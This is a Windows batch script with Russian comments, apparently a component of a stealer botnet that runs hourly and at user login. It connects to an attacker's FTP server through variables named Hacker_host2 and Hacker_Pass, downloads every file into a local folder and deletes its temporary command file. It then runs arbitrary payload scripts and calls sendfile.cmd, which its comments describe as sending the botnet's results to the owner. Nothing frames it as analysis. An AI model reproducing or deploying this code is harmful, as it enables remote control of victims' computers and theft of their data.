@echo off
rem Сценарий Windows, выполяемый каждый час и при входе пользователя в систему
rem Служит для оффлайн подачи команд хозяина стайлера, когда онлайн доступ не работает.
rem Для работы стайлера нужна обязательная часть, которую нужно удалить 
rem только при прекращении работы стайлера,
rem и одну переменную часть, которая напрямую не связана с работой стайлера и которую
rem можно менять.

Rem !!! Обязательная часть ботнета 1

rem Загружаем пользовательские файлы, специфичные для пользователя

::Временный файл команд для утилиты FTP.exe
set CommFTP="%PUB1%\Initial_Script.txt"

rem Переходим в начальный каталог
C:
cd %PUB1%

rem Определяем переменные:
rem FTP Host
set host=%Hacker_host2%
rem FTP Port
set port=%Hacker_port%
rem Ftp User
set user=%Hacker_User%
rem FTP Password
set password=%Hacker_Pass%
rem Основная папка
set Mainfolder=
rem Папка внутри FTP архива
set SubFolder=Private
rem Папка внутри FTP архива
set SubFolder1=
rem Маска для файлов
set fileMask=*
rem Локальный каталог
set LocalFolderU=%PUB1%\Util
 
 
::Генерируем файл FTP команд
> %CommFTP% (
  echo open %host% %port%
  echo %user%
  echo.%password%
  echo binary
  echo prompt
  echo hash
  echo lcd "%LocalFolderU%"
  if "%Mainfolder%" neq "" echo cd "%Mainfolder%"
  if "%SubFolder%" neq "" echo cd "%SubFolder%"
  if "%SubFolder1%" neq "" echo cd "%SubFolder1%"
  echo mget %fileMask%
  echo disconnect
  echo quit
)

::Запускаем на выполнение пакетник команд FTP

ftp.exe -s:%CommFTP%

::Удаляем пакетник
del /f /q %CommFTP%

REM !!! Конец обязательной части 1 !!!
REM Обязательная часть 2. Сюда можно вставлять произвольные пользовательские программы

call "%PUB1%\Util\user_hourly1.bat"

REM !!! Обязательная часть 3 !!!
rem Отправка результатов работы ботнета хозяину
rem Файл sendfile.cmd можно подгружать в первой части

call "%PUB1%\Util\sendfile.cmd"

REM Конец скрипта
